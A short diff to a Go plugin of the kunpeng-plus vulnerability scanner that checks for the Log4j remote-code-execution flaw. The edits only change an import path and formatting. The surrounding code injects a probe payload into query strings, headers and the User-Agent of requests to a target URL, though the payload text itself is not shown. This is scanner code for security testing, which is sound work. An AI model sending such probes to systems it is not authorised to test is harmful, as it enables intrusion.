@@ -4,7 +4,7 @@ import (
 	"fmt"
 	plugin "github.com/deenrookie/kunpeng-plus/pocs"
 	"github.com/deenrookie/kunpeng-plus/utils"
-	"github.com/opensec-cn/kunpeng/util"
+	util "github.com/deenrookie/kunpeng-plus/utils"
 	"net/http"
 	"strings"
 	"time"
@@ -42,6 +42,7 @@ func (d *log4jRCE) GetResult() []plugin.Plugin {
 }
 
 func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
+
 	_ = meta
 	// count := 0
 	randStr := utils.RandStringRunes(10)
@@ -101,7 +102,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 					_, _ = util.RequestDo(request, false)
 				}
 
-				request, _ = http.NewRequest(method, URL+reqPath + "?id=" + fullPayload, nil)
+				request, _ = http.NewRequest(method, URL+reqPath+"?id="+fullPayload, nil)
 				for _, header := range headers {
 					request.Header.Set(header, fullPayload)
 					request.Header.Set("User-Agent", fullPayload)
